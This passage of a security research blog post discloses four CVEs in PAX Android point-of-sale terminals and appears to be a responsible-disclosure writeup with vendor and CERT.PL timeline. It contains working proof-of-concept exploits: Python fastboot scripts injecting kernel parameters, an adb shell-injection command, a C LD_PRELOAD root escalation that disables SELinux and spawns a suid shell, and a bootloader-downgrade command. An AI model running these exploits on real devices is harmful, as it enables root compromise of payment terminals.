<div class="wp-block-image">
<figure class="aligncenter size-full is-resized"><a href="https://blog.stmcyber.com/wp-content/uploads/2023/09/545b8f39-b884-4ade-a768-4560fda57d83.png"><img fetchpriority="high" decoding="async" width="758" height="479" src="https://blog.stmcyber.com/wp-content/uploads/2023/09/545b8f39-b884-4ade-a768-4560fda57d83.png" alt="" class="wp-image-1050" style="width:760px;height:481px" srcset="https://blog.stmcyber.com/wp-content/uploads/2023/09/545b8f39-b884-4ade-a768-4560fda57d83.png 758w, https://blog.stmcyber.com/wp-content/uploads/2023/09/545b8f39-b884-4ade-a768-4560fda57d83-300x190.png 300w" sizes="(max-width: 758px) 100vw, 758px" /></a></figure></div>


<p>If the provided partition name is <code data-enlighter-language="generic" class="EnlighterJSRAW">pax1</code>, and <code data-enlighter-language="generic" class="EnlighterJSRAW">paxAssert</code>, the configuration will be applied:</p>


<div class="wp-block-image">
<figure class="aligncenter size-full"><a href="https://blog.stmcyber.com/wp-content/uploads/2023/09/9a81019f-3776-479b-8a15-3d93ac7b03ec.png"><img decoding="async" width="797" height="258" src="https://blog.stmcyber.com/wp-content/uploads/2023/09/9a81019f-3776-479b-8a15-3d93ac7b03ec.png" alt="" class="wp-image-1051" srcset="https://blog.stmcyber.com/wp-content/uploads/2023/09/9a81019f-3776-479b-8a15-3d93ac7b03ec.png 797w, https://blog.stmcyber.com/wp-content/uploads/2023/09/9a81019f-3776-479b-8a15-3d93ac7b03ec-300x97.png 300w, https://blog.stmcyber.com/wp-content/uploads/2023/09/9a81019f-3776-479b-8a15-3d93ac7b03ec-768x249.png 768w" sizes="(max-width: 797px) 100vw, 797px" /></a></figure></div>


<p><code data-enlighter-language="generic" class="EnlighterJSRAW">pax1</code> is a special partition that doesn't contain filesystem but behaves more like a configuration map. Certain values from this map are used as kernel parameters (and allow spaces in their values), giving us kernel parameter injection.</p>



<p>Attached below is a PoC script, which chains kernel parameter injection with custom rootfs executed from a fastboot buffer (technique explained in depth <a href="https://alephsecurity.com/2017/08/30/untethered-initroot/">here</a>).</p>



<pre class="EnlighterJSRAW" data-enlighter-language="python" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">from pathlib import Path
import sys
import tempfile
from contextlib import contextmanager
from usb1 import USBContext, USBError, USBDeviceHandle

# these 4 values may need to be changed on per-product basis:
PAX_VID = 0x2fb8
PAX_PID = 0x2240
ep_in = 0x85
ep_out = 0x06

# we assume this will be used only after open_fastboot
g_handle: USBDeviceHandle = None  # type: ignore

def send(bytez: bytes) -> None:
    print(f"Sending {len(bytez)} {bytez[:0x18]}...")
    g_handle.bulkWrite(ep_out, bytez)

def recv(count: int = 512) -> bytes:
    data = g_handle.bulkRead(ep_in, count)
    print("Got status", data)
    return data

def cmd(data: bytes) -> bytes:
    send(data)
    return recv()

def check_status(expected, received):
    if received != expected:
        raise RuntimeError(f"Expected status {expected}, got, {received}")

@contextmanager
def open_fastboot(*args, **kwargs):
    with USBContext() as ctx:
        device = ctx.getByVendorIDAndProductID(PAX_VID, PAX_PID)
        if device is None:
            print("Device not found")
            exit(1)
        try:
            global g_handle
            g_handle = device.open()
        except USBError:
            print("Failed to open USB device")
            exit(1)

        with g_handle.claimInterface(0):
            yield

def upload_image(path: Path) -> None:
    total_size = path.stat().st_size
    send(f"download:{total_size:08x}".encode())
    response = recv()
    check_status(b"DATA", response[:4])

    with open(path, "rb") as file:
        while True:
            data = file.read(512)
            if not data:
                break
            send(data)

    response = recv()
    check_status(b"OKAY", response)

def flash(partition_name: str) -> None:
    check_status(b"OKAY", cmd(f"flash:{partition_name}".encode()))

def upload_data(bytez: bytes) -> None:
    # yes, I know this could be done better but I'm too lazy
    with tempfile.NamedTemporaryFile() as tmp:
        tmp.write(bytez)
        tmp.flush()
        upload_image(Path(tmp.name))

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("invalid number of parameters, please provide image")
        sys.exit(1)

    initrd_image = Path(sys.argv[1])
    initrd_size = initrd_image.stat().st_size

    with open_fastboot():
        print("enabling paxassert")
        upload_data(b"yes\x00")
        check_status(cmd(b"oem paxassert"), b"OKAY")

        print("pushing pax1 partition")
        upload_data(f'LOCALE="pl-PL initrd=0x82000000,{initrd_size}"'.encode())

        print("flashing pax1")
        flash("pax1")

        print("pushing initrd")
        upload_image(initrd_image)

        check_status(b"OKAY", cmd(b"continue"))</pre>



<h2 class="wp-block-heading" id="CVE-2023-42135">CVE-2023-42135 - Local code execution as root via kernel parameter injection in fastboot</h2>



<ul class="wp-block-list">
<li>Product: PAX A920Pro/PAX A50/PAX A77</li>



<li>CVSS Score: CVSS 7.6 (AV:P/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)</li>



<li>Impact: Local code execution as <code data-enlighter-language="generic" class="EnlighterJSRAW">root</code></li>



<li>Known vulnerable version: PayDroid 8.1.0_Sagittarius_11.1.50_20230614</li>



<li>Fix verified in: PayDroid 8.1.0_Sagittarius_V02.9.99T9_20230919</li>



<li>CERT.PL reference: <a href="https://cert.pl/en/posts/2024/01/CVE-2023-4818/">https://cert.pl/en/posts/2024/01/CVE-2023-4818/</a></li>
</ul>



<p>Contents of an unsigned “partition” named&nbsp;<code data-enlighter-language="generic" class="EnlighterJSRAW">exsn</code>&nbsp;are concatenated to the kernel argument list. By flashing this&nbsp;<code data-enlighter-language="generic" class="EnlighterJSRAW">exsn</code>&nbsp;partition, it’s possible to inject arbitrary kernel arguments, resulting in arbitrary code execution.</p>



<p>Fastboot flashing handler function, first checks if we’re trying to flash a special partition:</p>


<div class="wp-block-image">
<figure class="aligncenter size-full is-resized"><a href="https://blog.stmcyber.com/wp-content/uploads/2023/09/545b8f39-b884-4ade-a768-4560fda57d83-1.png"><img decoding="async" width="758" height="479" src="https://blog.stmcyber.com/wp-content/uploads/2023/09/545b8f39-b884-4ade-a768-4560fda57d83-1.png" alt="" class="wp-image-1052" style="width:760px;height:481px" srcset="https://blog.stmcyber.com/wp-content/uploads/2023/09/545b8f39-b884-4ade-a768-4560fda57d83-1.png 758w, https://blog.stmcyber.com/wp-content/uploads/2023/09/545b8f39-b884-4ade-a768-4560fda57d83-1-300x190.png 300w" sizes="(max-width: 758px) 100vw, 758px" /></a></figure></div>


<p>The value of <code data-enlighter-language="generic" class="EnlighterJSRAW">exsn</code> is passed in to kernel. Since <code data-enlighter-language="generic" class="EnlighterJSRAW">exsn</code> can be changed to any value, including one with spaces, it possible to inject any kernel parameters.</p>


<div class="wp-block-image">
<figure class="aligncenter size-full"><a href="https://blog.stmcyber.com/wp-content/uploads/2023/09/33cbd702-0b7d-414f-aeac-a6e29979170c.png"><img loading="lazy" decoding="async" width="650" height="201" src="https://blog.stmcyber.com/wp-content/uploads/2023/09/33cbd702-0b7d-414f-aeac-a6e29979170c.png" alt="" class="wp-image-1053" srcset="https://blog.stmcyber.com/wp-content/uploads/2023/09/33cbd702-0b7d-414f-aeac-a6e29979170c.png 650w, https://blog.stmcyber.com/wp-content/uploads/2023/09/33cbd702-0b7d-414f-aeac-a6e29979170c-300x93.png 300w" sizes="auto, (max-width: 650px) 100vw, 650px" /></a></figure></div>


<p>Attached below is PoC script, which chains kernel parameter injection with custom initroot executed from fastboot buffer (technique explained in depth <a href="https://alephsecurity.com/2017/08/30/untethered-initroot/">here</a>).</p>



<pre class="EnlighterJSRAW" data-enlighter-language="python" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">from pathlib import Path
import sys
import tempfile
from contextlib import contextmanager
from usb1 import USBContext, USBError, USBDeviceHandle

# these 4 values may need to be changed on per-product basis:
PAX_VID = 0x2fb8
PAX_PID = 0x2240
ep_in = 0x85
ep_out = 0x06

# we assume this will be used only after open_fastboot
g_handle: USBDeviceHandle = None  # type: ignore

def send(bytez: bytes) -> None:
    print(f"Sending {len(bytez)} {bytez[:0x18]}...")
    g_handle.bulkWrite(ep_out, bytez)

def recv(count: int = 512) -> bytes:
    data = g_handle.bulkRead(ep_in, count)
    print("Got status", data)
    return data

def cmd(data: bytes) -> bytes:
    send(data)
    return recv()

def check_status(expected, received):
    if received != expected:
        raise RuntimeError(f"Expected status {expected}, got, {received}")

@contextmanager
def open_fastboot(*args, **kwargs):
    with USBContext() as ctx:
        device = ctx.getByVendorIDAndProductID(PAX_VID, PAX_PID)
        if device is None:
            print("Device not found")
            exit(1)
        try:
            global g_handle
            g_handle = device.open()
        except USBError:
            print("Failed to open USB device")
            exit(1)

        with g_handle.claimInterface(0):
            yield

def upload_image(path: Path) -> None:
    total_size = path.stat().st_size
    send(f"download:{total_size:08x}".encode())
    response = recv()
    check_status(b"DATA", response[:4])

    with open(path, "rb") as file:
        while True:
            data = file.read(512)
            if not data:
                break
            send(data)

    response = recv()
    check_status(b"OKAY", response)

def flash(partition_name: str) -> None:
    check_status(b"OKAY", cmd(f"flash:{partition_name}".encode()))

def upload_data(bytez: bytes) -> None:
    # yes, I know this could be done better but I'm too lazy
    with tempfile.NamedTemporaryFile() as tmp:
        tmp.write(bytez)
        tmp.flush()
        upload_image(Path(tmp.name))

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("invalid number of parameters, please provide image")
        sys.exit(1)

    initrd_image = Path(sys.argv[1])
    initrd_size = initrd_image.stat().st_size

    with open_fastboot():
        exsn = get_exsn()
        initrd_size = initrd_image.stat().st_size
        exsn_data = exsn + b" initrd=0x82000000," + str(int(initrd_size)).encode()
        print("exsn_data:", exsn_data)

        print("pushing exsn")
        upload_data(exsn_data)

        print("flashing exsn")
        flash("exsn")

        print("pushing initrd")
        upload_image(initrd_image)

        check_status(b"OKAY", cmd(b"continue"))</pre>



<h2 class="wp-block-heading" id="CVE-2023-42136">CVE-2023-42136 - Privilege escalation from any user/application to system user via shell injection binder-exposed service</h2>



<ul class="wp-block-list">
<li>Product: All Android-based PAX POS devices</li>



<li>CVSS Score: CVSS 8.8 (AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H)</li>



<li>Impact: Privilege escalation from any user/application to <code data-enlighter-language="generic" class="EnlighterJSRAW">system</code> user</li>



<li>Known vulnerable version: PayDroid 11.1.50_20230614</li>



<li>Fix verified in: PayDroid V02.9.99T9_20230919</li>



<li>CERT.PL reference: <a href="https://cert.pl/en/posts/2024/01/CVE-2023-4818/">https://cert.pl/en/posts/2024/01/CVE-2023-4818/</a></li>
</ul>



<p>Android service named&nbsp;<code data-enlighter-language="generic" class="EnlighterJSRAW">PaxSmartDeviceServcie</code>&nbsp;(typo intended) is vulnerable to shell injection, escalating any user to&nbsp;<code data-enlighter-language="generic" class="EnlighterJSRAW">system</code>&nbsp;account. While it checks if the command starts with&nbsp;<code data-enlighter-language="generic" class="EnlighterJSRAW">dumpsys</code>, this check can be trivially bypassed by passing in&nbsp;<code data-enlighter-language="generic" class="EnlighterJSRAW">dumpsys; command</code>&nbsp;as an argument.</p>


<div class="wp-block-image">
<figure class="aligncenter size-full is-resized"><a href="https://blog.stmcyber.com/wp-content/uploads/2023/09/4ec25ad4-97ee-44ae-a402-31f5032f7963.png"><img loading="lazy" decoding="async" width="932" height="720" src="https://blog.stmcyber.com/wp-content/uploads/2023/09/4ec25ad4-97ee-44ae-a402-31f5032f7963.png" alt="" class="wp-image-1056" style="width:934px;height:722px" srcset="https://blog.stmcyber.com/wp-content/uploads/2023/09/4ec25ad4-97ee-44ae-a402-31f5032f7963.png 932w, https://blog.stmcyber.com/wp-content/uploads/2023/09/4ec25ad4-97ee-44ae-a402-31f5032f7963-300x232.png 300w, https://blog.stmcyber.com/wp-content/uploads/2023/09/4ec25ad4-97ee-44ae-a402-31f5032f7963-768x593.png 768w" sizes="auto, (max-width: 932px) 100vw, 932px" /></a></figure></div>


<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">adb shell "service call PaxSmartDeviceServcie 16 s16 'dumpsysx; id > /data/local/tmp/win'"</pre>



<h2 class="wp-block-heading" id="CVE-2023-42137">CVE-2023-42137 - Privilege escalation from system/shell user to root via insecure operations in systool_server daemon</h2>



<ul class="wp-block-list">
<li>Product: All Android-based PAX POS devices</li>



<li>CVSS Score: CVSS 8.8 (AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H)</li>



<li>Impact: Privilege escalation from <code data-enlighter-language="generic" class="EnlighterJSRAW">system</code>/<code data-enlighter-language="generic" class="EnlighterJSRAW">shell</code> user to <code data-enlighter-language="generic" class="EnlighterJSRAW">root</code> user</li>



<li>Known vulnerable version: PayDroid 11.1.50_20230614</li>



<li>Fixed verified in: PayDroid V02.9.99T9_20230919</li>



<li>CERT.PL reference: <a href="https://cert.pl/en/posts/2024/01/CVE-2023-4818/">https://cert.pl/en/posts/2024/01/CVE-2023-4818/</a></li>
</ul>



<p><code data-enlighter-language="generic" class="EnlighterJSRAW">systool_server</code> is a daemon exposed via binder running with root privileges. It exposes an API for execution of <code data-enlighter-language="generic" class="EnlighterJSRAW">miniunz</code> command with user controller input and output directory. An attacker can inject an arbitrary amount of parameters, including additional command flags. Furthermore, given that the attacker has control over both the source directory and the destination directory (<code><code data-enlighter-language="generic" class="EnlighterJSRAW">/tmp</code></code>), they can manipulate this situation by crafting malicious symbolic links within the <code data-enlighter-language="generic" class="EnlighterJSRAW">/tmp</code> directory. This allows the attacker to overwrite arbitrary files, potentially leading to the escalation of privileges. By overwriting specific files within the <code data-enlighter-language="generic" class="EnlighterJSRAW">/data</code> partition, the attacker may exploit this vulnerability to assume the privileges of a <code data-enlighter-language="generic" class="EnlighterJSRAW">system</code> user, thereby hijacking an application that runs with system-level privileges.</p>



<p><code data-enlighter-language="generic" class="EnlighterJSRAW">systool_server</code> performs multiple checks to verify caller uid and binary to ensure only verified binaries are using this API. These checks can be bypassed using good old <code data-enlighter-language="generic" class="EnlighterJSRAW">LD_PRELOAD</code>. Finally, to pop a fully interactive shell, we use mount without <code data-enlighter-language="generic" class="EnlighterJSRAW">nosuid</code> to create a suid binary. See the code below for PoC:</p>



<pre class="EnlighterJSRAW" data-enlighter-language="c" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">#include &lt;errno.h>
#include &lt;fcntl.h>
#include &lt;inttypes.h>
#include &lt;stdlib.h>
#include &lt;string.h>
#include &lt;stdio.h>
#include &lt;dlfcn.h>
#include &lt;unistd.h>
#include "binder.h"

struct binder_state *g_binder_state;
uint32_t target;

int binder_init() {
    struct binder_state* bs;
    bs = binder_open(128*1024);
    if (!bs) {
        fprintf(stderr, "failed to open binder driver\n");
        return -1;
    }
    char b[0x200];
    struct binder_io a;
    struct binder_io c;
    bio_init(&amp;a, &amp;b, 0x200, 4);
    bio_put_uint32(&amp;a, 0);
    bio_put_string16_x(&amp;a, "android.os.IServiceManager");
    bio_put_string16_x(&amp;a, "systool_binder");
    int status = binder_call(bs, &amp;a, &amp;c, 0, 2);
    if (status == 0) {
        int status2 = bio_get_ref(&amp;c);
        if (status2 != 0) {
            target = status2;
            binder_acquire(bs, status2);
        }
        binder_done(bs, &amp;a, &amp;c);
    }
    g_binder_state = bs;
    return 0;
}

void systoolExecShellCmdV2(char* src) {
    struct binder_io msg;
    struct binder_io reply;
    char buf[0x200];
    bio_init(&amp;msg, buf, 0x200, 4);
    bio_put_uint32(&amp;msg, 0);
    bio_put_string16_x(&amp;msg, "SystoolBinder");
    bio_put_uint32(&amp;msg, 3); // cmd
    bio_put_uint32(&amp;msg, 1); // subcmd
    bio_put_uint32(&amp;msg, 1); // num arguments
    bio_put_string16_x(&amp;msg, src);
    int status = binder_call(g_binder_state, &amp;msg, &amp;reply, target, 18);
    if (status == 0) {
        int ret1 = bio_get_uint32(&amp;reply);
        int ret2 = bio_get_uint32(&amp;reply);
        binder_done(g_binder_state, &amp;msg, &amp;reply);
        printf("ExecShellCmdV2: ret1=%d ret2=%d\n", ret1, ret2);
    }
}

int executed = 0;

int printf(const char* __fmt, ...) {
    if (executed)
        return 0;
    executed = 1;

    pid_t pid = getpid();
    fprintf(stderr, "[*] Hello from PID %d\n", pid);
    char linkbuf[0x100];
    readlink("/proc/self/exe", linkbuf, 0x100);
    fprintf(stderr, "[*] /proc/self/exe is pointing at %s\n", linkbuf);

    binder_init();

    // prep
    system("rm /tmp/monitor.bin");

    fprintf(stderr, "[*] disabling fs selinux\n");
    system("ln -s /sys/fs/selinux/enforce /tmp/monitor.bin");
    system("echo -n '0' > /data/local/tmp/zero");
    systoolExecShellCmdV2("/data/local/tmp/zero");

    // cleanup
    system("rm /data/local/tmp/zero");
    system("rm /tmp/monitor.bin");

    fprintf(stderr, "[*] setting up suid\n");
    system("chmod +s /data/local/tmp/escalate");

    fprintf(stderr, "[*] copying suid to /mnt\n");
    system("ln -s /mnt/escalate /tmp/monitor.bin");
    systoolExecShellCmdV2("/data/local/tmp/escalate");

    // cleanup
    system("rm /tmp/monitor.bin");

    fprintf(stderr, "[*] spawning shell\n");
    execve("/mnt/escalate", NULL, NULL);

    return 0;
}</pre>



<h2 class="wp-block-heading" id="CVE-2023-4818">CVE-2023-4818 - Bootloader downgrade via improper tokenization</h2>



<ul class="wp-block-list">
<li>Product: PAX A920</li>



<li>CVSS Score: CVSS 7.3 (AV:P/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)</li>



<li>Impact: Bootloader can be downgraded to a vulnerable version, resulting in local code execution as <code data-enlighter-language="generic" class="EnlighterJSRAW">root</code></li>



<li>Known vulnerable version: PayDroid 7.1.2_Aquarius_11.1.50_20230614</li>



<li>Fix verified in: PayDroid 7.1.2_Aquarius_V02.9.99T9_20230919</li>



<li>CERT.PL reference: <a href="https://cert.pl/en/posts/2024/01/CVE-2023-4818/">https://cert.pl/en/posts/2024/01/CVE-2023-4818/</a></li>
</ul>



<p>By switching to fastboot mode and flashing a partition named&nbsp;<code data-enlighter-language="generic" class="EnlighterJSRAW">aboot:</code>, it’s possible to downgrade the bootloader to a previously vulnerable, signed version (version check is skipped).</p>



<p>We skip the signature and version check since&nbsp;<code data-enlighter-language="generic" class="EnlighterJSRAW">aboot:</code>&nbsp;does not match any known partition name:</p>


<div class="wp-block-image">
<figure class="aligncenter size-full"><a href="https://blog.stmcyber.com/wp-content/uploads/2023/09/9540d621-dbd2-4bb5-8dde-84a882ca221e.png"><img loading="lazy" decoding="async" width="599" height="316" src="https://blog.stmcyber.com/wp-content/uploads/2023/09/9540d621-dbd2-4bb5-8dde-84a882ca221e.png" alt="" class="wp-image-1057" srcset="https://blog.stmcyber.com/wp-content/uploads/2023/09/9540d621-dbd2-4bb5-8dde-84a882ca221e.png 599w, https://blog.stmcyber.com/wp-content/uploads/2023/09/9540d621-dbd2-4bb5-8dde-84a882ca221e-300x158.png 300w" sizes="auto, (max-width: 599px) 100vw, 599px" /></a></figure></div>


<p>Then, the provided name is tokenized with&nbsp;<code data-enlighter-language="generic" class="EnlighterJSRAW">:</code>&nbsp;- ending up with just&nbsp;<code data-enlighter-language="generic" class="EnlighterJSRAW">aboot</code>. This way, we can bypass the version check and downgrade the bootloader.</p>


<div class="wp-block-image">
<figure class="aligncenter size-full"><a href="https://blog.stmcyber.com/wp-content/uploads/2023/09/88f46489-9673-46e7-a732-3c3be12b52e8.png"><img loading="lazy" decoding="async" width="610" height="539" src="https://blog.stmcyber.com/wp-content/uploads/2023/09/88f46489-9673-46e7-a732-3c3be12b52e8.png" alt="" class="wp-image-1058" srcset="https://blog.stmcyber.com/wp-content/uploads/2023/09/88f46489-9673-46e7-a732-3c3be12b52e8.png 610w, https://blog.stmcyber.com/wp-content/uploads/2023/09/88f46489-9673-46e7-a732-3c3be12b52e8-300x265.png 300w" sizes="auto, (max-width: 610px) 100vw, 610px" /></a></figure></div>


<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">fastboot flash 'aboot:' aboot.img</pre>



<h2 class="wp-block-heading">Disclosure timeline</h2>



<ul class="wp-block-list">
<li>07/04/2023 - first contact with vendor briefly describing vulnerabilities (no reply)</li>



<li>08/05/2023 - second attempt of contact with vendor (successful)</li>



<li>10/05/2023 - sent technical details explaining all vulnerabilities (with PoC)</li>



<li>01/08/2023 - contacted CERT.PL to assign CVEs (instant reply)</li>



<li>09/10/2023 - further contact with PAX to fix found vulnerabilities</li>



<li>30/11/2023 - STM Cyber verifies patches</li>



<li>15/01/2024 - Public release</li>
</ul>
        </div>
              </article>
          </div>
  </div>
  <footer>
    <div class="mid bar">
      <a class="main-page-link" href="https://stmcyber.com">
        <img class="stm-logo" src="https://blog.stmcyber.com/wp-content/themes/stm_research/assets/images/stm_logo.jpg" alt="STM logo">
      </a>
      <div id="footer-mid">
        <div id="unhackable-text">
          Hack <span>the Unhack</span>able
        </div>
              </div>
      <div id="contact">
        <div class="social-icons">
          <a href="https://twitter.com/stm_cyber" target="_blank"><img src="https://blog.stmcyber.com/wp-content/themes/stm_research/assets/images/twitter.svg" alt="Twitter"></a>
          <a href="https://github.com/STMCyber" target="_blank"><img src="https://blog.stmcyber.com/wp-content/themes/stm_research/assets/images/github.svg" alt="GitHub"></a>
          <a href="https://pl.linkedin.com/company/stm-cyber" target="_blank"><img src="https://blog.stmcyber.com/wp-content/themes/stm_research/assets/images/linkedin.svg" alt="LinkedIn"></a>
        </div>
        <div class="mail"><a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="89fbecfaece8fbeae1c9fafde4eaf0ebecfba7f9e5">[email&#160;protected]</a></div>
      </div>
    </div>
  </footer>
    <script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script>
    let shellDiv = document.getElementsByClassName("bash-cmd")[0];
    let commands = ["cat posts\/1047.txt","php get_post.php",".\/get_post.sh 1047","type E:\\posts\\1047.txt"];
    let shell = new Shell(commands, shellDiv);
    shell.start(true);
  </script>
  <!--
    <br />
    <b>Notice</b>:  Undefined index: cmd in <b>/var/www/blogv2/wp-content/themes/stm_research/shell.php</b> on line <b>86</b><br />
  -->
<script type="text/javascript" src="https://blog.stmcyber.com/wp-content/themes/stm_research/assets/js/stm.js" id="stm-basic-js"></script>
<script type="text/javascript" src="https://blog.stmcyber.com/wp-content/plugins/enlighter/cache/enlighterjs.min.js" id="enlighterjs-js"></script>
<script type="text/javascript" id="enlighterjs-js-after">
/* <![CDATA[ */
!function(e,n){if("undefined"!=typeof EnlighterJS){var o={"selectors":{"block":"pre.EnlighterJSRAW","inline":"code.EnlighterJSRAW"},"options":{"indent":4,"ampersandCleanup":true,"linehover":false,"rawcodeDbclick":false,"textOverflow":"break","linenumbers":false,"theme":"wpcustom","language":"generic","retainCssClasses":true,"collapse":false,"toolbarOuter":"","toolbarTop":"{BTN_RAW}{BTN_COPY}{BTN_WINDOW}{BTN_WEBSITE}","toolbarBottom":""}};(e.EnlighterJSINIT=function(){EnlighterJS.init(o.selectors.block,o.selectors.inline,o.options)})()}else{(n&&(n.error||n.log)||function(){})("Error: EnlighterJS resources not loaded yet!")}}(window,console);
/* ]]> */
</script>
</body>
</html>